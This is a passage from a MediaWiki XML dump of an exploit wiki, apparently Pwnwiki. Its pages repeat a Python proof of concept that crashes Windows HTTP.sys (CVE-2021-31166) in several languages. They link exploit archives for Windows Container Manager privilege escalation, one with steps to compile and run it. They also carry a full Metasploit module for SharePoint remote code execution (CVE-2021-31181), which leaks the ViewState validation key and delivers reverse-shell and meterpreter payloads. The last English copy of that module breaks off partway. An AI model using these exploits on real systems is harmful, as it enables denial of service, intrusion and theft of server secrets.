      <comment>Created page with "== Ссылка =="</comment>
      <origin>2909</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1060" sha1="70iukkc6p140dg8ag15pqz5l97ck7jf" xml:space="preserve">&lt;languages  /&gt;
== Воздействие уязвимости ==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
⚠️️При выполнении POC появится синий экран.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


== Ссылка ==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>70iukkc6p140dg8ag15pqz5l97ck7jf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/tr</title>
    <ns>0</ns>
    <id>2470</id>
    <revision>
      <id>2960</id>
      <timestamp>2021-05-18T02:00:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "⚠️️ POC yürütüldüğünde mavi bir ekran görünecektir."</comment>
      <origin>2960</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1024" sha1="nacapwvtjkquueez1ss44ch8gsjf180" xml:space="preserve">&lt;languages  /&gt;
== Güvenlik Açığı Etkisi ==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
⚠️️ POC yürütüldüğünde mavi bir ekran görünecektir.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


== Referans ==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>nacapwvtjkquueez1ss44ch8gsjf180</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/uk</title>
    <ns>0</ns>
    <id>2456</id>
    <revision>
      <id>2946</id>
      <timestamp>2021-05-18T01:50:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "When Коли виконується POC, з’явиться синій екран."</comment>
      <origin>2946</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1056" sha1="s6z48ar8hqeg88wnlp3szn6qyjz2oag" xml:space="preserve">&lt;languages  /&gt;
== Вплив вразливості ==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
When Коли виконується POC, з’явиться синій екран.
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


== Довідка ==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>s6z48ar8hqeg88wnlp3szn6qyjz2oag</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5086</id>
    <revision>
      <id>5826</id>
      <timestamp>2021-06-24T02:21:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-31166 HTTP協議棧遠程代碼執行漏洞"</comment>
      <origin>5826</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="978" sha1="0otzk7q5vbb67jaeb3j01o0ahsl2uco" xml:space="preserve">&lt;languages  /&gt;
==漏洞影響==
&lt;pre&gt;
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
&lt;/pre&gt;

==POC==
⚠️️執行該POC會出現藍屏。
&lt;pre&gt;
# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
&lt;/pre&gt;

==GIF==
[[File:windows.gif |500px]]


==參考==
https://github.com/0vercl0k/CVE-2021-31166</text>
      <sha1>0otzk7q5vbb67jaeb3j01o0ahsl2uco</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31167 Windows Container Manager Service 權限提升漏洞</title>
    <ns>0</ns>
    <id>3107</id>
    <revision>
      <id>3610</id>
      <timestamp>2021-05-30T02:06:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== The Container Manager Service does not configure STORVSP correctly when opening mapped named pipes leading to privilege escalation.  ==EXP== https://github.com/JustYo..."</comment>
      <origin>3610</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="219" sha1="h93f5jtuuijxzn2e9e73ga411iu1kun" xml:space="preserve">==INFO==
The Container Manager Service does not configure STORVSP correctly when opening mapped named pipes leading to privilege escalation.

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/GS20210512140155.tgz</text>
      <sha1>h93f5jtuuijxzn2e9e73ga411iu1kun</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31169 Windows容器管理器服務 權限提升漏洞</title>
    <ns>0</ns>
    <id>2526</id>
    <revision>
      <id>3022</id>
      <timestamp>2021-05-22T01:58:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== https://github.com/JustYoomoon/Exploit/blob/main/GS20210512135847.tgz   1）編譯C#項目。需要獲取NuGet庫。包含.NET 5和.NET 4.71版本。 2）在系統上..."</comment>
      <origin>3022</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="294" sha1="9gn819o6u6qv2c76zeg8y4tmno7p8hx" xml:space="preserve">==POC==
https://github.com/JustYoomoon/Exploit/blob/main/GS20210512135847.tgz


1）編譯C#項目。需要獲取NuGet庫。包含.NET 5和.NET 4.71版本。
2）在系統上安裝Microsoft Defender Application Guard或Windows沙盒，然後重新啟動。
3）以任何用戶帳戶運行POC。</text>
      <sha1>9gn819o6u6qv2c76zeg8y4tmno7p8hx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31181 Microsoft SharePoint Unsafe Control And ViewState 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>4684</id>
    <revision>
      <id>5385</id>
      <timestamp>2021-06-20T02:01:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.  ==EXP== &lt;pre&gt; ## # This module requir..."</comment>
      <origin>5385</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9886" sha1="9ce3rjv0p8fggeq63bv6n4knag4pgdz" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.

==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Sharepoint
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  XML_NS = {
    'wpp' =&gt; 'http://microsoft.com/sharepoint/webpartpages',
    'soap' =&gt; 'http://www.w3.org/2003/05/soap-envelope',
    'xsi' =&gt; 'http://www.w3.org/2001/XMLSchema-instance',
    'xsd' =&gt; 'http://www.w3.org/2001/XMLSchema'
  }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Microsoft SharePoint Unsafe Control and ViewState RCE',
        'Description' =&gt; %q{
          The EditingPageParser.VerifyControlOnSafeList method fails to properly validate user supplied data. This
          can be leveraged by an attacker to leak sensitive information in rendered-preview content. This module will
          leak the ViewState validation key and then use it to sign a crafted object that will trigger code execution
          when deserialized.

          Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.
        },
        'Author' =&gt; [
          'Unknown', # Reported to HP ZDI team, Vulnerability discovery
          'Spencer McIntyre', # Module
          'wvu' # Module
        ],
        'References' =&gt; [
          [ 'CVE', '2021-31181' ],
          [ 'ZDI', '21-573' ],
          [ 'URL', 'https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability' ]
        ],
        'DisclosureDate' =&gt; '2021-05-11',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; 'win',
        'Arch' =&gt; [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' =&gt; false,
        'Targets' =&gt; [
          [
            'Windows Command',
            {
              'Arch' =&gt; ARCH_CMD,
              'Type' =&gt; :win_cmd,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :win_dropper,
              'DefaultOptions' =&gt; {
                'CMDSTAGER::FLAVOR' =&gt; :psh_invokewebrequest,
                'PAYLOAD' =&gt; 'windows/x64/meterpreter_reverse_https'
              }
            }
          ],
          [
            'PowerShell Stager',
            {
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :psh_stager,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'windows/x64/meterpreter/reverse_https'
              }
            }
          ]
        ],
        'DefaultTarget' =&gt; 2,
        'DefaultOptions' =&gt; {
          'DotNetGadgetChain' =&gt; :TypeConfuseDelegate
        },
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('VALIDATION_KEY', [false, 'ViewState validation key']),
      OptString.new('COOKIE', [false, 'SharePoint cookie if you have one']),
      OptString.new('SP_LIST', [true, 'SharePoint site SPList', 'Documents']),
      # "Promote" these advanced options so we don't have to pass around our own
      OptString.new('HttpUsername', [false, 'SharePoint username']),
      OptString.new('HttpPassword', [false, 'SharePoint password'])
    ])
  end

  def post_auth?
    true
  end

  def username
    datastore['HttpUsername']
  end

  def password
    datastore['HttpPassword']
  end

  def cookie
    datastore['COOKIE']
  end

  def vuln_builds
    # https://docs.microsoft.com/en-us/officeupdates/sharepoint-updates
    # https://buildnumbers.wordpress.com/sharepoint/
    # Patched in May of 2021
    [
      [Rex::Version.new('15.0.0.0'), Rex::Version.new('15.0.0.5337')], # SharePoint 2013
      [Rex::Version.new('16.0.0.0'), Rex::Version.new('16.0.0.5149')], # SharePoint 2016
      [Rex::Version.new('16.0.0.10000'), Rex::Version.new('16.0.0.10373')] # SharePoint 2019
    ]
  end

  def check
    build = sharepoint_get_version('cookie' =&gt; cookie)

    if build.nil?
      return CheckCode::Unknown('Failed to retrieve the SharePoint version number')
    end

    if vuln_builds.any? { |build_range| build.between?(*build_range) }
      return CheckCode::Appears("SharePoint #{build} is a vulnerable build.")
    end

    CheckCode::Safe("SharePoint #{build} is not a vulnerable build.")
  end

  def exploit
    if (username.blank? &amp;&amp; password.blank?)
      if cookie.blank?
        fail_with(Failure::BadConfig, 'HttpUsername and HttpPassword or COOKIE are required for exploitation')
      end

      print_warning('Using the specified COOKIE for authentication')
    end

    if (@validation_key = datastore['VALIDATION_KEY'])
      print_status("Using ViewState validation key #{@validation_key}")
    else
      leak_web_config
    end

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :win_cmd
      execute_command(payload.encoded)
    when :win_dropper
      execute_cmdstager
    when :psh_stager
      execute_command(cmd_psh_payload(
        payload.encoded,
        payload.arch.first,
        remove_comspec: true
      ))
    end
  end

  def leak_web_config
    print_status('Leaking the ViewState validation key...')

    web_id = sharepoint_get_site_web_id('cookie' =&gt; cookie)
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the site web ID') unless web_id

    webpart = &lt;&lt;~WEBPART
      &lt;%@ Register TagPrefix="WebPartPages" Namespace="Microsoft.SharePoint.WebPartPage" Assembly="Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %&gt;
      &lt;%@ Register TagPrefix="att" Namespace="System.Web.UI.WebControls " Assembly="System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" %&gt;
    WEBPART
    webpart &lt;&lt; Nokogiri::XML(&lt;&lt;-WEBPART, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      &lt;WebPartPages:XsltListFormWebPart id="id01" runat="server" ListDisplayName="#{datastore['SP_LIST'].encode(xml: :text)}" WebId="{#{web_id.encode(xml: :text)}}"&gt;
        &lt;DataSources&gt;
          &lt;att:xmldatasource runat="server" id="XDS1"
            XPath="/configuration/system.web/machineKey"
            datafile="c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config" /&gt;
        &lt;/DataSources&gt;
        &lt;xsl&gt;
            &lt;xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
                &lt;xsl:output method="xml" indent="yes" /&gt;
                &lt;xsl:template match="/"&gt;
                    &lt;xsl:copy-of select="." /&gt;
                &lt;/xsl:template&gt;
            &lt;/xsl:stylesheet&gt;
        &lt;/xsl&gt;
      &lt;/WebPartPages:XsltListFormWebPart&gt;
    WEBPART

    envelope = '&lt;?xml version="1.0" encoding="utf-8"?&gt;'
    envelope &lt;&lt; Nokogiri::XML(&lt;&lt;-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      &lt;soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope"&gt;
        &lt;soap12:Body&gt;
          &lt;RenderWebPartForEdit xmlns="http://microsoft.com/sharepoint/webpartpages"&gt;
            &lt;webPartXml&gt;#{webpart.encode(xml: :text)}&lt;/webPartXml&gt;
          &lt;/RenderWebPartForEdit&gt;
        &lt;/soap12:Body&gt;
      &lt;/soap12:Envelope&gt;
    ENVELOPE

    res = send_request_cgi(
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, '_vti_bin', 'WebPartPages.asmx'),
      'cookie' =&gt; cookie,
      'ctype' =&gt; 'application/soap+xml; charset=utf-8',
      'data' =&gt; envelope
    )

    unless res
      fail_with(Failure::Unreachable, "Target did not respond to #{__method__}")
    end

    unless res.code == 200
      fail_with(Failure::NotFound, "Failed to retrieve #{normalize_uri(target_uri.path, '_vti_bin', 'WebPartPages.asmx')}")
    end

    xml_response = res.get_xml_document
    if xml_response.nil?
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (non-XML response body)')
    end

    xml_result = xml_response.xpath('//wpp:RenderWebPartForEditResult', XML_NS)&amp;.text
    unless xml_result
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //wpp:RenderWebPartForEditResult)')
    end

    xml_result = Nokogiri::XML(xml_result)
    web_part_pages = Nokogiri::XML(xml_result.xpath('//Properties').text)
    unless web_part_pages&amp;.root
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //Properties)')
    end

    unless (preview = web_part_pages.root.attr('__designer:Preview'))
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing attribute: __desiginer:Preview)')
    end
    preview = Nokogiri::HTML(CGI.unescapeHTML(preview))
    unless (@validation_key = preview.at('//machinekey/@validationkey')&amp;.text)
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //machinekey/@validationkey)')
    end

    print_good("ViewState validation key: #{@validation_key}")
  end

  def execute_command(cmd, _opts = {})
    sharepoint_execute_command_via_viewstate(cmd, @validation_key, { 'cookie' =&gt; cookie })
  end
end
&lt;/pre&gt;</text>
      <sha1>9ce3rjv0p8fggeq63bv6n4knag4pgdz</sha1>
    </revision>
    <revision>
      <id>5387</id>
      <parentid>5385</parentid>
      <timestamp>2021-06-20T02:04:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5387</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9897" sha1="suptucdr6nzk36bcsdcremtiy1wznny" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.

==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Sharepoint
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  XML_NS = {
    'wpp' =&gt; 'http://microsoft.com/sharepoint/webpartpages',
    'soap' =&gt; 'http://www.w3.org/2003/05/soap-envelope',
    'xsi' =&gt; 'http://www.w3.org/2001/XMLSchema-instance',
    'xsd' =&gt; 'http://www.w3.org/2001/XMLSchema'
  }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Microsoft SharePoint Unsafe Control and ViewState RCE',
        'Description' =&gt; %q{
          The EditingPageParser.VerifyControlOnSafeList method fails to properly validate user supplied data. This
          can be leveraged by an attacker to leak sensitive information in rendered-preview content. This module will
          leak the ViewState validation key and then use it to sign a crafted object that will trigger code execution
          when deserialized.

          Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.
        },
        'Author' =&gt; [
          'Unknown', # Reported to HP ZDI team, Vulnerability discovery
          'Spencer McIntyre', # Module
          'wvu' # Module
        ],
        'References' =&gt; [
          [ 'CVE', '2021-31181' ],
          [ 'ZDI', '21-573' ],
          [ 'URL', 'https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability' ]
        ],
        'DisclosureDate' =&gt; '2021-05-11',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; 'win',
        'Arch' =&gt; [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' =&gt; false,
        'Targets' =&gt; [
          [
            'Windows Command',
            {
              'Arch' =&gt; ARCH_CMD,
              'Type' =&gt; :win_cmd,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :win_dropper,
              'DefaultOptions' =&gt; {
                'CMDSTAGER::FLAVOR' =&gt; :psh_invokewebrequest,
                'PAYLOAD' =&gt; 'windows/x64/meterpreter_reverse_https'
              }
            }
          ],
          [
            'PowerShell Stager',
            {
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :psh_stager,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'windows/x64/meterpreter/reverse_https'
              }
            }
          ]
        ],
        'DefaultTarget' =&gt; 2,
        'DefaultOptions' =&gt; {
          'DotNetGadgetChain' =&gt; :TypeConfuseDelegate
        },
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('VALIDATION_KEY', [false, 'ViewState validation key']),
      OptString.new('COOKIE', [false, 'SharePoint cookie if you have one']),
      OptString.new('SP_LIST', [true, 'SharePoint site SPList', 'Documents']),
      # "Promote" these advanced options so we don't have to pass around our own
      OptString.new('HttpUsername', [false, 'SharePoint username']),
      OptString.new('HttpPassword', [false, 'SharePoint password'])
    ])
  end

  def post_auth?
    true
  end

  def username
    datastore['HttpUsername']
  end

  def password
    datastore['HttpPassword']
  end

  def cookie
    datastore['COOKIE']
  end

  def vuln_builds
    # https://docs.microsoft.com/en-us/officeupdates/sharepoint-updates
    # https://buildnumbers.wordpress.com/sharepoint/
    # Patched in May of 2021
    [
      [Rex::Version.new('15.0.0.0'), Rex::Version.new('15.0.0.5337')], # SharePoint 2013
      [Rex::Version.new('16.0.0.0'), Rex::Version.new('16.0.0.5149')], # SharePoint 2016
      [Rex::Version.new('16.0.0.10000'), Rex::Version.new('16.0.0.10373')] # SharePoint 2019
    ]
  end

  def check
    build = sharepoint_get_version('cookie' =&gt; cookie)

    if build.nil?
      return CheckCode::Unknown('Failed to retrieve the SharePoint version number')
    end

    if vuln_builds.any? { |build_range| build.between?(*build_range) }
      return CheckCode::Appears("SharePoint #{build} is a vulnerable build.")
    end

    CheckCode::Safe("SharePoint #{build} is not a vulnerable build.")
  end

  def exploit
    if (username.blank? &amp;&amp; password.blank?)
      if cookie.blank?
        fail_with(Failure::BadConfig, 'HttpUsername and HttpPassword or COOKIE are required for exploitation')
      end

      print_warning('Using the specified COOKIE for authentication')
    end

    if (@validation_key = datastore['VALIDATION_KEY'])
      print_status("Using ViewState validation key #{@validation_key}")
    else
      leak_web_config
    end

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :win_cmd
      execute_command(payload.encoded)
    when :win_dropper
      execute_cmdstager
    when :psh_stager
      execute_command(cmd_psh_payload(
        payload.encoded,
        payload.arch.first,
        remove_comspec: true
      ))
    end
  end

  def leak_web_config
    print_status('Leaking the ViewState validation key...')

    web_id = sharepoint_get_site_web_id('cookie' =&gt; cookie)
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the site web ID') unless web_id

    webpart = &lt;&lt;~WEBPART
      &lt;%@ Register TagPrefix="WebPartPages" Namespace="Microsoft.SharePoint.WebPartPage" Assembly="Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %&gt;
      &lt;%@ Register TagPrefix="att" Namespace="System.Web.UI.WebControls " Assembly="System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" %&gt;
    WEBPART
    webpart &lt;&lt; Nokogiri::XML(&lt;&lt;-WEBPART, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      &lt;WebPartPages:XsltListFormWebPart id="id01" runat="server" ListDisplayName="#{datastore['SP_LIST'].encode(xml: :text)}" WebId="{#{web_id.encode(xml: :text)}}"&gt;
        &lt;DataSources&gt;
          &lt;att:xmldatasource runat="server" id="XDS1"
            XPath="/configuration/system.web/machineKey"
            datafile="c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config" /&gt;
        &lt;/DataSources&gt;
        &lt;xsl&gt;
            &lt;xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
                &lt;xsl:output method="xml" indent="yes" /&gt;
                &lt;xsl:template match="/"&gt;
                    &lt;xsl:copy-of select="." /&gt;
                &lt;/xsl:template&gt;
            &lt;/xsl:stylesheet&gt;
        &lt;/xsl&gt;
      &lt;/WebPartPages:XsltListFormWebPart&gt;
    WEBPART

    envelope = '&lt;?xml version="1.0" encoding="utf-8"?&gt;'
    envelope &lt;&lt; Nokogiri::XML(&lt;&lt;-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      &lt;soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope"&gt;
        &lt;soap12:Body&gt;
          &lt;RenderWebPartForEdit xmlns="http://microsoft.com/sharepoint/webpartpages"&gt;
            &lt;webPartXml&gt;#{webpart.encode(xml: :text)}&lt;/webPartXml&gt;
          &lt;/RenderWebPartForEdit&gt;
        &lt;/soap12:Body&gt;
      &lt;/soap12:Envelope&gt;
    ENVELOPE

    res = send_request_cgi(
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, '_vti_bin', 'WebPartPages.asmx'),
      'cookie' =&gt; cookie,
      'ctype' =&gt; 'application/soap+xml; charset=utf-8',
      'data' =&gt; envelope
    )

    unless res
      fail_with(Failure::Unreachable, "Target did not respond to #{__method__}")
    end

    unless res.code == 200
      fail_with(Failure::NotFound, "Failed to retrieve #{normalize_uri(target_uri.path, '_vti_bin', 'WebPartPages.asmx')}")
    end

    xml_response = res.get_xml_document
    if xml_response.nil?
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (non-XML response body)')
    end

    xml_result = xml_response.xpath('//wpp:RenderWebPartForEditResult', XML_NS)&amp;.text
    unless xml_result
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //wpp:RenderWebPartForEditResult)')
    end

    xml_result = Nokogiri::XML(xml_result)
    web_part_pages = Nokogiri::XML(xml_result.xpath('//Properties').text)
    unless web_part_pages&amp;.root
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //Properties)')
    end

    unless (preview = web_part_pages.root.attr('__designer:Preview'))
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing attribute: __desiginer:Preview)')
    end
    preview = Nokogiri::HTML(CGI.unescapeHTML(preview))
    unless (@validation_key = preview.at('//machinekey/@validationkey')&amp;.text)
      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //machinekey/@validationkey)')
    end

    print_good("ViewState validation key: #{@validation_key}")
  end

  def execute_command(cmd, _opts = {})
    sharepoint_execute_command_via_viewstate(cmd, @validation_key, { 'cookie' =&gt; cookie })
  end
end
&lt;/pre&gt;</text>
      <sha1>suptucdr6nzk36bcsdcremtiy1wznny</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31181 Microsoft SharePoint Unsafe Control And ViewState 遠程代碼執行漏洞/en</title>
    <ns>0</ns>
    <id>4920</id>
    <revision>
      <id>5660</id>
      <timestamp>2021-06-24T01:54:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Affected Versions=="</comment>
      <origin>5660</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9866" sha1="7qgz3mwa6r2bxk1sheafyjd53gl8ncq" xml:space="preserve">&lt;languages /&gt;
==Affected Versions==
Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.

==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Sharepoint
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  XML_NS = {
    'wpp' =&gt; 'http://microsoft.com/sharepoint/webpartpages',
    'soap' =&gt; 'http://www.w3.org/2003/05/soap-envelope',
